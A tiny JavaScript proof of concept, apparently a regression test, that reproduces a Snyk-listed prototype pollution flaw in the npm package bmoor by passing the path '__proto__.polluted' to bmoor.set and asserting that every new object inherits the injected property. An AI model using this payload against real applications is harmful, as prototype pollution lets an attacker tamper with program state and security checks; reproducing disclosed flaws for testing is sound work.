//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
const bmoor = require("bmoor");
const assert = require("assert");

bmoor.set({}, "__proto__.polluted", "yes");

assert({}.polluted === "yes");
